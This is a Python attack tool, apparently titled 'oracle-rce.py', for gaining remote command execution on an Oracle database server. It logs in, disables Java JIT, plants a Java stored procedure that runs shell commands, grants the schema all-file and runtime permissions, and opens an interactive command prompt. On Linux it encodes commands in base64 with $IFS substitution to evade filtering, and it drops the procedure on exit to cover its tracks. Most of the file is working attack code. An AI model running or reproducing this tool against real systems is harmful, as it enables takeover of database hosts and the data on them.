# -*- coding: utf-8 -*-
# Edited By EstamelGG
# referer:https://oracle-base.com/articles/8i/shell-commands-from-plsql
import cx_Oracle
import sys
import signal
import getopt
import base64

#log
def normal(text):
	text = "[*]%s"%text
	return print(text)

def warning(text):
	text = "[!]%s"%text
	return print(text)

def error(text):
	text = "[X]%s"%text
	return print(text)

def executeresult(text):
	text = "[+]%s"%text
	return print(text)

#login
def login(user,pwd,host,port,sid):
	try:
		db = cx_Oracle.connect("%s"%user,"%s"%pwd,"%s:%s/%s"%(host,port,sid))
		normal("Login successfully, DB version:%s"%db.version)
		return db
	except Exception as e:
		error(e)
	
def getPlatform(cur):
	try:
		query = "select platform_name from v$database"
		cur.execute(query)
		result = cur.fetchone()
		normal("OS Platform:%s"%result)
		if "Linux" in str(result):
			return "Linux"
		elif "Windows" in str(result):
			return "Windows"
		else:
			return 0
	except Exception as e:
		error(e)

#disable JAVA_JIT
def JAVA_JIT(cur):
	query = "alter system set JAVA_JIT_ENABLED= FALSE scope = both"
	try:
		cur.execute(query)
		normal("JAVA_JIT Disabled")
	except Exception as e:
		error(e)

def CreatePLSQL(cur,usr):
	query1 = """
		CREATE OR REPLACE AND COMPILE 
		JAVA SOURCE NAMED "Host" 
		AS
		import java.io.*;
		public class Host {
		  public static void executeCommand(String command) {
		    try {
		      String[] finalCommand;
		      if (isWindows()) {
		        finalCommand = new String[4];
		        finalCommand[0] = "C://windows//system32//cmd.exe";    // Windows XP/2003
		        finalCommand[1] = "/y";
		        finalCommand[2] = "/c";
		        finalCommand[3] = command;
		      }
		      else {
		        finalCommand = new String[3];
		        finalCommand[0] = "/bin/sh";
		        finalCommand[1] = "-c";
		        finalCommand[2] = "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/git/bin:/usr/local/sbin:~/bin;export PATH;"+command;
		      }
		  
		      final Process pr = Runtime.getRuntime().exec(finalCommand);
		      pr.waitFor();

		      new Thread(new Runnable(){
		        public void run() {
		          BufferedReader br_in = null;
		          try {
		            br_in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
		            String buff = null;
		            while ((buff = br_in.readLine()) != null) {
		              System.out.println(buff);
		              try {} catch(Exception e) {}
		            }
		            br_in.close();
		          }
		          catch (IOException ioe) {
		            System.out.println("Exception caught printing process output.");
		            ioe.printStackTrace();
		          }
		          finally {
		            try {
		              br_in.close();
		            } catch (Exception ex) {}
		          }
		        }
		      }).start();
		  
		      new Thread(new Runnable(){
		        public void run() {
		          BufferedReader br_err = null;
		          try {
		            br_err = new BufferedReader(new InputStreamReader(pr.getErrorStream()));
		            String buff = null;
		            while ((buff = br_err.readLine()) != null) {
		              System.out.println(buff);
		              try {} catch(Exception e) {}
		            }
		            br_err.close();
		          }
		          catch (IOException ioe) {
		            System.out.println("Exception caught printing process error.");
		            ioe.printStackTrace();
		          }
		          finally {
		            try {
		              br_err.close();
		            } catch (Exception ex) {}
		          }
		        }
		      }).start();
		    }
		    catch (Exception ex) {
		      System.out.println(ex.getLocalizedMessage());
		    }
		  }
		  public static boolean isWindows() {
		    if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1)
		      return true;
		    else
		      return false;
		  }
		}
	"""

	query2 = """
		CREATE OR REPLACE PROCEDURE host_command (p_command  IN  VARCHAR2)
		AS LANGUAGE JAVA 
		NAME 'Host.executeCommand (java.lang.String)';
	"""

	query3 = """
		DECLARE
		  l_schema VARCHAR2(30) := '%s';
		BEGIN
		  DBMS_JAVA.grant_permission(l_schema, 'java.io.FilePermission', '<<ALL FILES>>', 'read ,write, execute, delete');
		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
		END;
	"""%user

	try:
		cur.execute(query1)
		normal("Java Created")
		cur.execute(query2)
		normal("Procedure Created")
		try:
			cur.execute(query3)
			normal("\"%s\" Permission Granted"%user)
		except Exception as e:
			warning("\"%s\" Permission NOT Granted"%user)
			warning(e)
			pass
		cur.callproc("dbms_output.enable", (1024,))
		cur.callproc("dbms_java.set_output",(100000,))
		normal("Enable OutPut")
		normal("PL/SQL Procedure successfully completed")
		#normal("Grant Successfully")
		print("="*64)
		return cur
	except Exception as e:
		error(e)
		sys.exit()

#command encrypt
def command_encrypt(platform,cmd):
	if platform == "Linux":
		b64cmd = base64.b64encode(cmd.encode('utf-8'))
		cmd = "echo \"%s\"|base64 -d|/bin/sh"%(str(b64cmd,'utf-8'))
		cmd = cmd.replace(" ","$IFS")
		return cmd
	elif platform == "Windows":
		return cmd
#run code
def rce(cur,cmd):
	query = """
	DECLARE
		  l_output DBMS_OUTPUT.chararr;
		  l_lines  INTEGER := 1000;
	BEGIN
		host_command('%s');
		DBMS_OUTPUT.get_lines(l_output, l_lines);
		FOR i IN 1 .. l_lines LOOP
			DBMS_OUTPUT.put_line(l_output(i));
		END LOOP;
	END;
	"""%(cmd)
	cur.execute(query)
	#get result
	result = ""
	statusVar = cur.var(cx_Oracle.NUMBER)
	lineVar = cur.var(cx_Oracle.STRING)
	while True:
		try:
			cur.callproc("dbms_output.get_line", (lineVar, statusVar))
			if statusVar.getvalue() != 0:
				break
			text = lineVar.getvalue()
			if text == None:
				text = "\r\n"
			print(text)
		except Exception as e:
			error(e)

#clean Procedure
def dropproc(cur):
	query = "drop procedure host_command"
	cur.execute(query)

def quit(signum, frame):
	dropproc(cur)
	print()
	warning("Procedure Dropped")
	sys.exit()

#default
port = '1521'
host = '127.0.0.1'
user = ''
pwd = ''
sid = ''
#get args
try:
	opts, args = getopt.getopt(sys.argv[1:],"hi:u:p:h:P:s:")
	if len(opts) == 0:
		print('usage: oracle-rce.py -i <host> -u <user> -p <password> -P <port> -s <sid/service>')
		sys.exit()
except getopt.GetoptError:
	print('usage: oracle-rce.py -i <host> -u <user> -p <password> -P <port> -s <sid/service>')
	sys.exit()

for opt, arg in opts:
	if opt == '-h':
		print('usage: oracle-rce.py -i <host> -u <user> -p <password> -P <port> -s <sid/service>')
		sys.exit()
	elif opt == "-i":
		host = arg
	elif opt == "-u":
		user = arg
	elif opt == "-p":
		pwd = arg
	elif opt == "-P":
		ort = arg
	elif opt == "-s":
		sid = arg

normal("Target: %s:%s/%s"%(host,port,sid))
#login and others
db = login(user,pwd,host,port,sid)
cur = db.cursor()
platform = getPlatform(cur)
signal.signal(signal.SIGINT, quit)
signal.signal(signal.SIGTERM, quit)
JAVA_JIT(cur)
CreatePLSQL(cur,user)
executeresult("Execute Command:")
#Different Platform
if platform == "Linux":
	while True:
		cmd = input(">>>")
		if cmd:
			cmd = command_encrypt("Linux",cmd)
			rce(cur,cmd)

elif platform == "Windows":
	while True:
		cmd = input(">>>")
		if cmd:
			cmd = command_encrypt("Windows",cmd)
			rce(cur,cmd)

#Clean
dropproc(cur)
print()
warning("Procedure Dropped")
